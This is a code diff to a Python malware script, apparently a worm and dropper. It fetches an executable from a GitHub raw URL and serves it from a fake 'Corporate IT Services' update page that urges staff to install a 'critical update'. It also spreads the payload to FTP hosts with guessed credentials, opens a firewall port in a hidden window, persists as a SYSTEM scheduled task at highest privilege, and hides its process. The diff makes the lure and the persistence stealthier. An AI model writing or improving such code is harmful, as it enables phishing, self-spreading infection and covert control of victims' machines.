@@ -17,11 +17,13 @@ from datetime import datetime
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"
+PAYLOAD_PATH = None
 
 def generate_random_name(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 def download_payload():
+    global PAYLOAD_PATH
     try:
         random_name = f'{generate_random_name()}.exe'
         destination_path = os.path.join(os.environ('TEMP'), random_name)
@@ -29,85 +31,73 @@ def download_payload():
         if response.status_code == 200:
             with open(destination_path, 'wb') as f:
                 f.write(response.content)
+            PAYLOAD_PATH = destination_path
         return destination_path
     except:
         return None
 
-# HTTP server to serve init.exe and fake login page
+# HTTP server to serve init.exe and update portal
 class HTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        random_name = generate_random_name()
-        if self.path == f'/{random_name}.exe':
+        if self.path == '/update.exe':
             self.send_response(200)
             self.send_header('Content-type', 'application/octet-stream')
             self.end_headers()
-            payload_path = download_payload()
-            if os.path.exists(payload_path):
-                with open(payload_path, 'rb') as f:
-                    self.wfile.write(f.read())
-            else:
-                self.send_response(404)
-                self.end_headers()
-        elif self.path == '/login':
+            if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+            else: payload_path = download_payload()
+            with open(payload_path, 'rb') as f:
+                self.wfile.write(f.read())
+        elif self.path == '/':
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            html = f"""
+            html = """
             <html>
                 <head>
-                    <style>
-                        body {{ font-family: Arial; text-align: center; }}
-                        .login {{ width: 300px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; }}
-                        input {{ margin: 10px; padding: 5px; width: 200px; }}
-                        button {{ padding: 10px 20px; }}
-                    </style>
+                    <title>Corporate System Update</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                 </head>
-                <body>
-                    <div class="login">
-                        <h1>Corporate File Access</h1>
-                        <form>
-                            <input type="text" placeholder="Username"><br>
-                            <input type="password" placeholder="Password"><br>
-                            <button type="submit">Login</button>
-                        </form>
-                        <p>Download update: <a href="/{random_name}.exe">Install Update</a></p>
-                    </div>
-                </body>
-            </html>
-            """
-            self.wfile.write(html.encode('utf-8'))
-        elif self.path == '/files':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            html = f"""
-            <html>
-                <head>
-                    <style>
-                        body {{ font-family: Arial; text-align: center; }}
-                        .files {{ margin: 50px auto; }}
-                    </style>
-                </head>
-                <body>
-                    <div class="files">
-                        <h1>Shared Documents</h1>
-                        <p>Download: <a href="/{random_name}.exe">Q2 Report.exe</a></p>
-                    </div>
+                <body class="bg-gray-100 font-sans">
+                    <!-- Header -->
+                    <header class="bg-blue-600 text-white py-4">
+                        <div class="container mx-auto px-4">
+                            <h1 class="text-2xl font-bold">Corporate IT Services</h1>
+                        </div>
+                    </header>
+                    <!-- Hero Section -->
+                    <section class="py-12 text-center">
+                        <div class="container mx-auto px-4">
+                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Critical System Update Required</h2>
+                            <p class="text-lg text-gray-600 mb-6">Install the latest update by July 10, 2025, to maintain network access and ensure security compliance.</p>
+                            <!-- Fake Progress Bar -->
+                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
+                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 75%"></div>
+                            </div>
+                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update Now</a>
+                        </div>
+                    </section>
+                    <!-- Footer -->
+                    <footer class="bg-gray-800 text-white py-4">
+                        <div class="container mx-auto px-4 text-center">
+                            <p>&copy; 2025 Corporate IT Services. All rights reserved.</p>
+                        </div>
+                    </footer>
                 </body>
             </html>
             """
             self.wfile.write(html.encode('utf-8'))
 
-# Start HTTP server
+# Start HTTP server and open firewall
 def start_http_server():
     try:
         # Add firewall rule for port 80
         subprocess.run(
-            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80',
-            shell=True, capture_output=True, text=True
+            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=8080',
+            shell=True, capture_output=True, text=True, creationflags=0x08000000  # Hide window
         )
-        server = HTTPServer(('0.0.0.0', 80), HTTPHandler)
-        threading.Thread(target=server.serve_forever, daemon=True).start()
+        server = HTTPServer(('0.0.0.0', 8080), HTTPHandler)
+        server.serve_forever()
     except:
         pass
 
@@ -276,7 +266,8 @@ def ftp_spread():
                         ftp = ftplib.FTP(ip, timeout=1)
                         ftp.login(user, pwd)
                         random_name = f'{generate_random_name()}.exe'
-                        payload_path = download_payload()
+                        if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
+                        else: payload_path = download_payload()
                         if payload_path:
                             with open(payload_path, 'rb') as f:
                                 ftp.storbinary(f'STOR {random_name}', f)
@@ -309,8 +300,8 @@ def persist_registry():
 def persist_schtasks():
     task_name = generate_random_name()
     exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc daily /st 00:00 /ru SYSTEM'
-    subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
+    subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)  # Hide window
 
 # Persistence via process creation trigger
 def persist_process_trigger():
@@ -334,7 +325,7 @@ def persist_process_trigger():
 # Main execution
 if __name__ == '__main__':
     import sys
-    destination_path = download_payload()
+    download_payload()
     start_http_server()
     ftp_spread()
     hide_process()
